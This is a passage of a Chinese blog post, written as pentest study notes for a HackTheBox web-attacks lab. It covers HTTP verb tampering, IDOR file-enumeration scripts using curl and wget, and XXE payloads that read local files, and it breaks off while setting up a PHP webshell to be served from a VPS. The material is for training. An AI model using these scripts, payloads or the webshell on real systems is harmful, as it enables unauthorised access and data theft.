@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="WEB ATTACKSHTTP方法篡改(HTTP Verb Tampering)HTTP方法有9种，其中PUT和DELETE等方法存在敏感操作  PUT：将请求的payload写到指定地方 DELETE：删除某个地方的资源 OPTIONS：向服务器询问指定资源支持的HTTP方法 HEAD：请求资源的响应头信息，而不返回响应体  HEAD方法和GET方法很像，只是返回时不返回服务器的Payload。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB渗透学习-WEBATTACKS">
+<meta property="og:url" content="http://example.com/2024/09/23/HTB-22-WEBATTACKS/index.html">
+<meta property="og:site_name" content="ShuiChang厕纸博客站">
+<meta property="og:description" content="WEB ATTACKSHTTP方法篡改(HTTP Verb Tampering)HTTP方法有9种，其中PUT和DELETE等方法存在敏感操作  PUT：将请求的payload写到指定地方 DELETE：删除某个地方的资源 OPTIONS：向服务器询问指定资源支持的HTTP方法 HEAD：请求资源的响应头信息，而不返回响应体  HEAD方法和GET方法很像，只是返回时不返回服务器的Payload。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-09-22T16:16:33.000Z">
+<meta property="article:modified_time" content="2025-02-26T15:57:35.357Z">
+<meta property="article:author" content="ShuiChang">
+<meta property="article:tag" content="渗透测试学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB渗透学习-WEBATTACKS</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/02/%E7%AE%80%E5%8D%95%E7%9A%84GO%E5%BA%94%E7%94%A8-%E4%BB%A5%E4%B8%80%E4%B8%AA%E7%88%AC%E8%99%AB%E8%84%9A%E6%9C%AC%E4%B8%BA%E4%BE%8B/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/09/23/HTB-%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/09/23/HTB-22-WEBATTACKS/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&text=HTB渗透学习-WEBATTACKS"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&title=HTB渗透学习-WEBATTACKS"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&is_video=false&description=HTB渗透学习-WEBATTACKS"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB渗透学习-WEBATTACKS&body=Check out this article: http://example.com/2024/09/23/HTB-22-WEBATTACKS/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&title=HTB渗透学习-WEBATTACKS"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&title=HTB渗透学习-WEBATTACKS"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&title=HTB渗透学习-WEBATTACKS"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&title=HTB渗透学习-WEBATTACKS"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&name=HTB渗透学习-WEBATTACKS&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&t=HTB渗透学习-WEBATTACKS"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB-ATTACKS"><span class="toc-number">1.</span> <span class="toc-text">WEB ATTACKS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP%E6%96%B9%E6%B3%95%E7%AF%A1%E6%94%B9-HTTP-Verb-Tampering"><span class="toc-number">1.1.</span> <span class="toc-text">HTTP方法篡改(HTTP Verb Tampering)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8OPTIONS%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%81%E8%AE%B8%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">使用OPTIONS查看目标服务器允许的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.2.</span> <span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%9C%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%9B%B4%E6%8E%A5%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8%E2%80%9D-Insecure-Direct-Object-References-IDOR"><span class="toc-number">1.2.</span> <span class="toc-text">“不安全的直接对象引用”(Insecure Direct Object References, IDOR)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">枚举文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%BB%E5%BA%A6hash%EF%BC%9AJS%E9%80%86%E5%90%91"><span class="toc-number">1.2.2.</span> <span class="toc-text">轻度hash：JS逆向</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-XXE"><span class="toc-number">1.3.</span> <span class="toc-text">XML外部实体注入(XXE)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84XXE%E6%B5%8B%E8%AF%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">简单的XXE测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8XXE-RCE"><span class="toc-number">1.3.2.</span> <span class="toc-text">使用XXE RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8XXE%E6%9D%A5SSRF"><span class="toc-number">1.3.3.</span> <span class="toc-text">使用XXE来SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8CDATA-%E5%8F%8A-XML%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%EF%BC%88XML-Parameter-Entities%EF%BC%89"><span class="toc-number">1.3.4.</span> <span class="toc-text">使用CDATA 及 XML参数实体（XML Parameter Entities）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E7%9B%B2%E6%B3%A8-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.5.</span> <span class="toc-text">XXE盲注 &#x2F; 基于错误的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.6.</span> <span class="toc-text">XXE盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EHTTP"><span class="toc-number">1.3.6.1.</span> <span class="toc-text">基于HTTP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EDNS"><span class="toc-number">1.3.6.2.</span> <span class="toc-text">基于DNS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%A4%96%E5%B8%A6XXE"><span class="toc-number">1.3.6.3.</span> <span class="toc-text">自动外带XXE</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB渗透学习-WEBATTACKS
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ShuiChang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-09-22T16:16:33.000Z" class="dt-published" itemprop="datePublished">2024-09-23</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" rel="tag">渗透测试学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="WEB-ATTACKS"><a href="#WEB-ATTACKS" class="headerlink" title="WEB ATTACKS"></a>WEB ATTACKS</h1><h2 id="HTTP方法篡改-HTTP-Verb-Tampering"><a href="#HTTP方法篡改-HTTP-Verb-Tampering" class="headerlink" title="HTTP方法篡改(HTTP Verb Tampering)"></a>HTTP方法篡改(HTTP Verb Tampering)</h2><p>HTTP方法有<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">9种</a>，其中PUT和DELETE等方法存在敏感操作</p>
+<ul>
+<li>PUT：将请求的payload写到指定地方</li>
+<li>DELETE：删除某个地方的资源</li>
+<li>OPTIONS：向服务器询问指定资源支持的HTTP方法</li>
+<li>HEAD：请求资源的响应头信息，而不返回响应体</li>
+</ul>
+<p>HEAD方法和GET方法很像，只是返回时不返回服务器的Payload。</p>
+<p>示例：只防了GET，没防其他协议：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;/^[A-Za-z\s]+$/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;Select * from ports where port_code like &#x27;%&quot;</span> . <span class="variable">$_REQUEST</span>[<span class="string">&quot;code&quot;</span>] . <span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">    ...SNIP...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用OPTIONS查看目标服务器允许的方法"><a href="#使用OPTIONS查看目标服务器允许的方法" class="headerlink" title="使用OPTIONS查看目标服务器允许的方法"></a>使用OPTIONS查看目标服务器允许的方法</h3><ul>
+<li><code>curl -i -X OPTIONS http://SERVER_IP:PORT/</code></li>
+</ul>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul>
+<li>Apache .htaccess<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Directory</span> &quot;/<span class="attr">var</span>/<span class="attr">www</span>/<span class="attr">html</span>/<span class="attr">admin</span>&quot;&gt;</span></span><br><span class="line">    AuthType Basic</span><br><span class="line">    AuthName &quot;Admin Panel&quot;</span><br><span class="line">    AuthUserFile /etc/apache2/.htpasswd</span><br><span class="line">    <span class="tag">&lt;<span class="name">Limit</span> <span class="attr">GET</span>&gt;</span></span><br><span class="line">        Require valid-user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Limit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>Tomcat web.xml<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/admin/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">role-name</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>ASP.NET<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">system.web</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">authorization</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">allow</span> <span class="attr">verbs</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">roles</span>=<span class="string">&quot;admin&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">deny</span> <span class="attr">verbs</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">users</span>=<span class="string">&quot;*&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">deny</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">allow</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">authorization</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">system.web</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="“不安全的直接对象引用”-Insecure-Direct-Object-References-IDOR"><a href="#“不安全的直接对象引用”-Insecure-Direct-Object-References-IDOR" class="headerlink" title="“不安全的直接对象引用”(Insecure Direct Object References, IDOR)"></a>“不安全的直接对象引用”(Insecure Direct Object References, IDOR)</h2><p>大概是“应用程序直接使用用户提供的输入来访问系统对象（如数据库记录或文件），而没有进行适当的访问控制，可能导致未经授权的用户访问或修改敏感数据。”也就是<code>?filename=123.pdf</code>和<code>?filename=Admin.pdf</code>都能访问这种</p>
+<ul>
+<li>Ajax调用：可查看Ajax内容找到可供修改的地方</li>
+<li>文件名或其它资源的Hash&#x2F;编码可破译（如<code>?filename=ZmlsZV8xMjMucGRm</code>就是<code>?filename=file_123.pdf</code>）</li>
+</ul>
+<h3 id="枚举文件"><a href="#枚举文件" class="headerlink" title="枚举文件"></a>枚举文件</h3><p>假设现有一个网页documents.php，其点击链接可以下载内容，Render后的HTML页面是这样的，每个页面有一个Invoice和一个Report：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&#x27;pure-tree_link&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;/documents/Invoice_3_06_2020.pdf&#x27;</span> <span class="attr">target</span>=<span class="string">&#x27;_blank&#x27;</span>&gt;</span>Invoice<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&#x27;pure-tree_link&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;/documents/Report_3_01_2020.pdf&#x27;</span> <span class="attr">target</span>=<span class="string">&#x27;_blank&#x27;</span>&gt;</span>Report<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用CURL下载后，可以通过唯一指定标识进行grep定位<br><code>curl -s &quot;http://SERVER_IP:PORT/documents.php?uid=1&quot; | grep &quot;&lt;li class=&#39;pure-tree_link&#39;&gt;&quot;</code></p>
+<blockquote>
+<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
+<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
+</blockquote>
+<p>进一步，使用正则定位pdf文件的内容<br><code>curl -s &quot;http://SERVER_IP:PORT/documents.php?uid=3&quot; | grep -oP &quot;\/documents.*?.pdf&quot;</code></p>
+<blockquote>
+<p>&#x2F;documents&#x2F;Invoice_3_06_2020.pdf<br>&#x2F;documents&#x2F;Report_3_01_2020.pdf</p>
+</blockquote>
+<p>最后使用for循环遍历所有uid，获取所有页面的链接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://SERVER_IP:PORT&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..10&#125;; <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">link</span> <span class="keyword">in</span> $(curl -s <span class="string">&quot;<span class="variable">$url</span>/documents.php?uid=<span class="variable">$i</span>&quot;</span> | grep -oP <span class="string">&quot;\/documents.*?.pdf&quot;</span>); <span class="keyword">do</span></span><br><span class="line">                wget -q <span class="variable">$url</span>/<span class="variable">$link</span></span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>POST的话，可以使用<code>curl -X POST</code>来指定请求方式</p>
+<h3 id="轻度hash：JS逆向"><a href="#轻度hash：JS逆向" class="headerlink" title="轻度hash：JS逆向"></a>轻度hash：JS逆向</h3><p>一些文件是前端加密的，故可以通过逆向JS实现文件名破译</p>
+<p>如，一个先base64再md5 hash后的内容就可以这样枚举：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://83.136.255.40:37688/download.php?contract=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..20&#125;; <span class="keyword">do</span></span><br><span class="line">	<span class="keyword">for</span> bi <span class="keyword">in</span> $(<span class="built_in">echo</span> -n <span class="variable">$i</span> | <span class="built_in">base64</span> -w 0 ); <span class="keyword">do</span></span><br><span class="line">		curl -sOJ $url<span class="variable">$bi</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-s</code>：表示静默模式（silent），它会隐藏进度信息和错误信息，保证执行时不输出多余的内容。</li>
+<li><code>-O</code>：告诉 curl 下载服务器响应的内容并保存为远程服务器的文件名。也就是说，它会根据服务器返回的文件名将文件保存到本地。</li>
+<li><code>-J</code>：启用内容处置（Content-Disposition）头的处理。如果服务器通过 Content-Disposition 头返回了一个文件名，curl 将使用这个文件名来保存下载的文件（与 <code>-O</code> 结合使用时）。</li>
+</ul>
+<h2 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h2><p>工具：<a target="_blank" rel="noopener" href="https://github.com/enjoiz/XXEinjector">XXEinjector</a></p>
+<h3 id="简单的XXE测试"><a href="#简单的XXE测试" class="headerlink" title="简单的XXE测试"></a>简单的XXE测试</h3><p>假设现有一个登录界面传送的是XML格式的内容，并且存在回显：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">### DTD 与 XML语言规范</span><br><span class="line">该节引用[这篇文章](https://teamssix.com/191209-192903)</span><br><span class="line">``` XML</span><br><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span> </span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--DTD，文档类型声明--&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [ &lt;!-- #定义此文档是note类型 --&gt; </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">body</span>)&gt;</span> &lt;!--#定义note元素有一个元素：&quot;body&quot; --&gt; </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span> &lt;!-- #定义body元素为&quot;#PCDATA&quot;类型 --&gt; </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="string">&quot;hello world&quot;</span>&gt;</span> &lt;!-- #定义一个内部实体 --&gt; </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>&amp;writer;</code>实体引用了定义的内部实体，输出时即输出”hello world”</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span> &lt;!-- #定义元素为ANY，即可以接受任何元素。 --&gt; </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/test.dtd&quot;</span> &gt;</span>]&gt;</span> <span class="comment">&lt;!-- 定义一个名为 &#x27;xxe&#x27; 的外部实体，引用系统中的文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span> <span class="comment">&lt;!-- 在 &#x27;body&#x27; 标签中引用这个外部实体 &#x27;xxe&#x27; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>DOCTYPE定义了一个文档类型foo，并且在内部声明了一个外部实体xxe。</li>
+<li>SYSTEM 标志表示这是一个外部实体，并引用系统中的一个外部资源（在这种情况下是本地文件系统中的文件）</li>
+</ul>
+<h3 id="使用XXE-RCE"><a href="#使用XXE-RCE" class="headerlink" title="使用XXE RCE"></a>使用XXE RCE</h3><ul>
+<li>找到SSH密钥</li>
+<li>（Windows）偷密码的hash</li>
+<li>使用php:&#x2F;&#x2F;expect的filter（需要启用PHP expect的模组）<ul>
+<li>通过这种方式写马：</li>
+<li>在VPS上放马<ul>
+<li><code>echo &#39;&lt;?php system($_REQUEST[&quot;cmd&quot;]);?&gt;&#39; &gt; shell.php</code></li>
+<li><code>sudo python3 -m http.server 80</code></li>
+</ul>
+</li>
